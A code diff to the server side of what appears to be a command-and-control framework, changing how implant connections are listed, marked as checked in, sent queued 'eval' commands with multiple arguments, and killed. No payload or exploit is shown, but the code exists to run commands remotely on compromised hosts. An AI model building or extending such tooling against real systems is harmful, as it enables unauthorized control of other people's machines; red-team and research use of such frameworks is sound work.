@@ -18,10 +18,14 @@ class Connection():
 
     def __str__(self):
         internet_addr = self.system_information['ip']
-        return f'A {self.stager.format} implant, {internet_addr}, is {self.status} and last checked in at {self.get_current_time(self.last_checkin)}.'
+        #return f'A {self.stager.format} implant, {internet_addr}, is {self.status} and last checked in at {self.get_current_time(self.last_checkin)}.'
+        return '{:<10} {:<15} {:<10} {:<10}'.format(self.stager.format, internet_addr, self.status, self.get_current_time(self.last_checkin))
 
     def check_in(self):
-        self.status = 'connected'
+        ip = self.system_information['ip']
+        if self.status != 'connected':
+            self.status = 'connected'
+            color.success(f'Successful connection ({ip})')
         self.last_checkin = time.time()
         return 0, 'Success'
 
@@ -50,7 +54,8 @@ class Connection():
                     self.connection_cli.update_options(self.menu_options)
         function = f'{option[0]}()'
         if len(option) > 1:
-            function = f'{option[0]}({option[1]})'
+            arguments = ','.join(option[1:])
+            function = f'{option[0]}({arguments})'
         function = parse.quote(function)
         self.command_queue.append('{' + '"eval":' + f'"{function}"' + '}')
         color.verbose('{' + '"eval":' + f'"{function}"' + '}')
@@ -64,8 +69,9 @@ class Connection():
         return 0, 'Success'
 
     def interact(self):
-        self.menu_options['discover'] = util.MenuOption(self.discover_functions, 'Discovers new options from provided files within the extensions directory. (e.g., discover stdlib.jscript)', 'Connection Options', color.normal, True)
+        self.menu_options['discover'] = util.MenuOption(self.discover_functions, 'Discovers new options from provided files within the extensions directory (e.g., discover stdlib.jscript).', 'Connection Options', color.normal, True)
         self.menu_options['information'] = util.MenuOption(self.information, 'Displays gathered system information.', 'Connection Options', color.normal, False)
+        self.menu_options['kill'] = util.MenuOption(self.execute, 'Kills the current connection.', 'Connection Options', color.normal, False)
         internet_addr = self.system_information['ip']
         self.connection_cli = cli.CommandLine(f'connection ({internet_addr}) :')
         self.update_options()
